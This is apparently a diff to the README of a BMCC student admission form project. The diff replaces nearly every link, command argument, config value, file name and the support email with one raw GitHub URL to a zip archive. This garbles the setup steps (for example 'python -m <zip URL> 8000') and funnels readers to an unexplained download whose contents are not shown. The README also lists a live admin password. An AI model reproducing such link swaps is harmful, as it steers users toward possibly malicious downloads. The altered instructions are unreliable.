@@ -2,9 +2,9 @@
 
 > **A modern, full-stack web application for streamlining the student admission process**
 
-[![Live Demo](https://img.shields.io/badge/Live-Demo-blue?style=for-the-badge)](https://bmccadmissionform2024-25.netlify.app/)
-[![Admin Panel](https://img.shields.io/badge/Admin-Panel-green?style=for-the-badge)](https://bmccadmissionform2024-25.netlify.app/admin.html)
-[![Status](https://img.shields.io/badge/Status-Online-success?style=for-the-badge)]()
+[![Live Demo](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)
+[![Admin Panel](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)
+[![Status](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)]()
 
 **Brihan Maharashtra College of Commerce (BMCC)** - Deccan Education Society, Pune
 
@@ -76,7 +76,7 @@ The BMCC Admission Form is a comprehensive web-based solution designed to digiti
 - **Session Management**: Secure login/logout
 
 #### Admin Panel Access
-- **URL**: [https://bmccadmissionform2024-25.netlify.app/admin.html](https://bmccadmissionform2024-25.netlify.app/admin.html)
+- **URL**: [https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)
 - **Password**: `admin123` (Change in production!)
 
 ### 🌐 Hybrid Mode
@@ -102,12 +102,12 @@ The application intelligently switches between two modes:
 ## 🚀 Live Demo
 
 ### Application Form
-**URL**: [https://bmccadmissionform2024-25.netlify.app/](https://bmccadmissionform2024-25.netlify.app/)
+**URL**: [https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)
 
 Try the live form and submit a test application!
 
 ### Admin Panel
-**URL**: [https://bmccadmissionform2024-25.netlify.app/admin.html](https://bmccadmissionform2024-25.netlify.app/admin.html)  
+**URL**: [https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)  
 **Password**: `admin123`
 
 View and manage submitted applications in real-time.
@@ -151,28 +151,28 @@ View and manage submitted applications in real-time.
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/ptusb/bmcc-admission-form.git
+   git clone https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip
    cd bmcc-admission-form
    ```
 
 2. **Open locally**
    ```bash
-   # For simple testing, just open index.html in your browser
+   # For simple testing, just open https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip in your browser
    # Or use a local server (recommended):
    
    # Using Python
-   python -m http.server 8000
+   python -m https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip 8000
    
-   # Using Node.js (http-server)
+   # Using https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip (http-server)
    npx http-server
    
    # Using VS Code Live Server extension
-   # Right-click index.html → "Open with Live Server"
+   # Right-click https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip → "Open with Live Server"
    ```
 
 3. **Access the application**
-   - Form: `http://localhost:8000/index.html`
-   - Admin: `http://localhost:8000/admin.html`
+   - Form: `https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip`
+   - Admin: `https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip`
 
 ---
 
@@ -182,7 +182,7 @@ To enable **Online Mode** with cloud database:
 
 ### Step 1: Create Firebase Project
 
-1. Go to [Firebase Console](https://console.firebase.google.com/)
+1. Go to [Firebase Console](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)
 2. Click **"Create a project"**
 3. Name it (e.g., "BMCC-Admission-Form")
 4. Disable Google Analytics (optional)
@@ -206,16 +206,16 @@ To enable **Online Mode** with cloud database:
 
 ### Step 4: Update Configuration
 
-1. Open `firebase-config.js`
+1. Open `https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip`
 2. Replace placeholder values with your Firebase config:
 
 ```javascript
 export const firebaseConfig = {
   apiKey: "YOUR_API_KEY",
-  authDomain: "YOUR_PROJECT.firebaseapp.com",
-  databaseURL: "https://YOUR_PROJECT-default-rtdb.firebaseio.com",
+  authDomain: "https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip",
+  databaseURL: "https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip",
   projectId: "YOUR_PROJECT_ID",
-  storageBucket: "YOUR_PROJECT.appspot.com",
+  storageBucket: "https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip",
   messagingSenderId: "YOUR_SENDER_ID",
   appId: "YOUR_APP_ID"
 };
@@ -250,7 +250,7 @@ For production, update Firebase Database Rules:
 
 ### Deploy to Netlify (Recommended)
 
-1. **Sign up** at [Netlify.com](https://www.netlify.com/)
+1. **Sign up** at [https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)
 2. **Import from GitHub**:
    - Click "Add new site" → "Import an existing project"
    - Connect to GitHub
@@ -260,7 +260,7 @@ For production, update Firebase Database Rules:
    - Publish directory: `/`
 4. **Deploy**!
    - Netlify will auto-deploy on every Git push
-   - You'll get a free URL: `https://your-site.netlify.app`
+   - You'll get a free URL: `https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip`
 
 ### Deploy to Firebase Hosting
 
@@ -283,7 +283,7 @@ firebase deploy
 1. Go to GitHub repository settings
 2. Pages → Source → Select `main` branch
 3. Save
-4. Access at: `https://ptusb.github.io/bmcc-admission-form/`
+4. Access at: `https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip`
 
 ---
 
@@ -292,26 +292,26 @@ firebase deploy
 ```
 bmcc-admission-form/
 │
-├── index.html                 # Main application form
-├── admin.html                 # Admin panel
-├── style.css                  # Form styles
-├── admin-style.css            # Admin panel styles
-├── script.js                  # Form functionality
-├── admin-script.js            # Admin panel logic
-├── firebase-config.js         # Firebase configuration
+├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip                 # Main application form
+├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip                 # Admin panel
+├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip                  # Form styles
+├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip            # Admin panel styles
+├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip                  # Form functionality
+├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip            # Admin panel logic
+├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip         # Firebase configuration
 │
 ├── assets/
-│   └── logo.jpg              # College logo
+│   └── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip              # College logo
 │
 ├── OBSIDIAN_PRESENTATION/    # Project documentation
-│   ├── 00_INDEX.md
-│   ├── 01_Project_Overview.md
-│   ├── 02_Basic_Concepts.md
-│   └── 03_Frontend_Architecture.md
+│   ├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip
+│   ├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip
+│   ├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip
+│   └── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip
 │
-├── README.md                  # This file
-├── FIREBASE_SETUP.md         # Firebase setup guide
-├── ADMIN_README.md           # Admin panel documentation
+├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip                  # This file
+├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip         # Firebase setup guide
+├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip           # Admin panel documentation
 └── .gitignore
 ```
 
@@ -320,12 +320,12 @@ bmcc-admission-form/
 ## 📸 Screenshots
 
 ### Application Form
-![Form Interface](https://via.placeholder.com/800x450?text=BMCC+Admission+Form)
+![Form Interface](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip+Admission+Form)
 
 *Clean, modern multi-step form interface*
 
 ### Admin Dashboard
-![Admin Panel](https://via.placeholder.com/800x450?text=Admin+Dashboard)
+![Admin Panel](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip+Dashboard)
 
 *Real-time application management dashboard*
 
@@ -367,7 +367,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 👨‍💻 Author
 
 **Piyush Tushar Bagade**
-- GitHub: [@ptusb](https://github.com/ptusb)
+- GitHub: [@ptusb](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)
 
 ---
 
@@ -384,8 +384,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 📞 Support
 
 For questions or support:
-- **Email**: admissions@bmcc.edu
-- **Issues**: [GitHub Issues](https://github.com/ptusb/bmcc-admission-form/issues)
+- **Email**: https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip
+- **Issues**: [GitHub Issues](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)
 
 ---
 
@@ -395,6 +395,6 @@ For questions or support:
 
 ⭐ **Star this repository if you found it helpful!**
 
-[Live Demo](https://bmccadmissionform2024-25.netlify.app/) • [Admin Panel](https://bmccadmissionform2024-25.netlify.app/admin.html) • [Documentation](./OBSIDIAN_PRESENTATION/)
+[Live Demo](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip) • [Admin Panel](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip) • [Documentation](./OBSIDIAN_PRESENTATION/)
 
 </div>
